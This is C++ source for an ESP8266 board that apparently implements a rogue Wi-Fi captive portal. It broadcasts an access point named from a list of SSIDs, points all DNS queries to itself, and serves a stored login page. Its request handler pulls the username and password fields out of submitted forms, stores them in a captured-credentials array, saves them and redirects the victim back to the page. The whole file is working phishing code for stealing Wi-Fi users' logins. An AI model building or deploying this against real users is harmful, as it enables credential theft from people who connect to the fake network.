AsyncWebServer httpd(80);
IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;
DNSServer dnsServer;

void asyncCaptiveSetup(){

  ESP.eraseConfig();
  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  //WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  String apstr = SSIDlist[numberOfInterrupts2].name;
  int str_len = apstr.length() + 1;
  char ap[str_len];
  apstr.toCharArray(ap, str_len);

  WiFi.hostname(ap);
  WiFi.softAP(ap);

  //MDNS.addService("http","tcp",80);

  SPIFFS.begin();

  httpd.serveStatic("/", SPIFFS, "/").setDefaultFile("index.htm");

  httpd.onNotFound([](AsyncWebServerRequest *request){
    Serial.printf("NOT_FOUND: ");
    if(request->method() == HTTP_GET)
      Serial.printf("GET");
    else if(request->method() == HTTP_POST)
      Serial.printf("POST");
    else if(request->method() == HTTP_DELETE)
      Serial.printf("DELETE");
    else if(request->method() == HTTP_PUT)
      Serial.printf("PUT");
    else if(request->method() == HTTP_PATCH)
      Serial.printf("PATCH");
    else if(request->method() == HTTP_HEAD)
      Serial.printf("HEAD");
    else if(request->method() == HTTP_OPTIONS)
      Serial.printf("OPTIONS");
    else
      Serial.printf("UNKNOWN");
    Serial.printf(" http://%s%s\n", request->host().c_str(), request->url().c_str());

    if(request->contentLength()){
      Serial.printf("_CONTENT_TYPE: %s\n", request->contentType().c_str());
      Serial.printf("_CONTENT_LENGTH: %u\n", request->contentLength());
    }

    int headers = request->headers();
    int i;
    for(i=0;i<headers;i++){
      AsyncWebHeader* h = request->getHeader(i);
      Serial.printf("_HEADER[%s]: %s\n", h->name().c_str(), h->value().c_str());
    }

    int params = request->params();
    for(i=0;i<params;i++){
      AsyncWebParameter* p = request->getParam(i);
      if(p->isFile()){
        Serial.printf("_FILE[%s]: %s, size: %u\n", p->name().c_str(), p->value().c_str(), p->size());
      } else if(p->isPost()){
        Serial.printf("_POST[%s]: %s\n", p->name().c_str(), p->value().c_str());

        if(p->name() == String("u"))
            p->value().toCharArray(capturedCredentials[capturecount].username, 32);
        if(p->name() == String("p")){
            p->value().toCharArray(capturedCredentials[capturecount].password, 32);
            saveCredentials();
            capturecount++;
        }

      } else {
        Serial.printf("_GET[%s]: %s\n", p->name().c_str(), p->value().c_str());
      }
    }
    AsyncWebServerResponse *response = request->beginResponse ( 302, "text/plain", "" );
    //request->send(404);
    response->addHeader ( "Location", "http://192.168.4.1/index.htm" );
    request->send ( response );
  });

   //httpd.on("/wifisave", handleWifiSave);

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  httpd.begin();
}

void captiveLoop() {
  dnsServer.processNextRequest();
}
